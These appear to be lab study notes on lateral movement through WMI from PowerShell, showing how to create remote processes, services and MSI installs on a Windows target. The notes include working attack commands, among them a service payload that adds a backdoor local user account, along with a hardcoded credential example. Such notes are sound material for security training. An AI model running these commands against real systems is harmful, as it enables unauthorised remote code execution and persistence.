# Windows Management Instrumentation
 WMI exposes a wide range of information about the system, including hardware components, operating system settings, installed software, and more. It allows administrators and developers to query and manipulate this information programmatically using scripting languages like PowerShell.  
 - Monitor system resources, such as CPU, memory, disk space, and network activity
 - Administrators can use WMI to retrieve and modify system configuration settings
 - WMI supports remote administration, enabling administrators to manage and monitor remote computers in a network

 ## Connecting to WMI from PowerShell
 - Create a PSCredential object with user and password
 - Object will be stored in the `$credential` variable

`$username = 'Administrator';`  
`$password = 'Mypass123';`  
`$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;`  
`$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;`

Establish a WMI session using either of the following protocols:
#### DCOM
- RPC over ip will be used for connecting to WMI
- Port 135/TCP and ports 49152-65535/TCP

#### Wsman
- WinRM will be used for connecting to WMI
- Port 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

Establish a WMI session from PowerShell, we can use the following commands and store the session of `$Session` variable:

`$Opt = New-CimSessionOption -Protocol DCOM`  
`$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop`  

- `New-CimSessionOption` cmdlet is used to configure the connection options for WMI session + connection protocol
- Options and credentials are password to `New-CimSession` cmdlet to establish a session against a remote host

## Remote Process Creation using WMI
Port:
- 135/TCP, 49152-65535/TCP (DCERPC)
- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

Spawn a process from PowerShell by utilizing WMI + send a WMI request to Win32_Process class to spawn the process under the session we created before:

`$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";`

`Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command}`

- WMI will not allow you to see the ouput of any command but will create the required process silently

## Creating Services Remotely with WMI
Port:
- 135/TCP, 49152-65535/TCP (DCERPC)
- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

Required Group Membership: 
- Admin  

Plan:
- Create service with WMI via PowerShell
- Create a service called THMService2

`Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{`  
`Name = "THMService2";`  
`DisplayName = "THMService2";`  
`PathName = "net user munra2 Pass123 /add"; # Your payload`  
`ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process`  
`StartMode = "Manual"`
`}`

- Find and start service  

`$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"`  

`Invoke-CimMethod -InputObject $Service -MethodName StartService`  

- Stop/Delete the service

`Invoke-CimMethod -InputObject $Service -MethodName StopService`  

`Invoke-CimMethod -InputObject $Service -MethodName Delete`

## Installing MSI Packages via WMI
Port:
- 135/TCP, 49152-65535/TCP (DCERPC)
- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

Required Group Membership:
- Admin 

Plan:
- MSI is a file format used for installers
- If we can copy an MSI package to the target system, we can use WMI to install it
- File can be copied any way available to the attacker
- Once the MSI file is on the target system, we can install by invoking the Win32_Product class via WMI

`Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`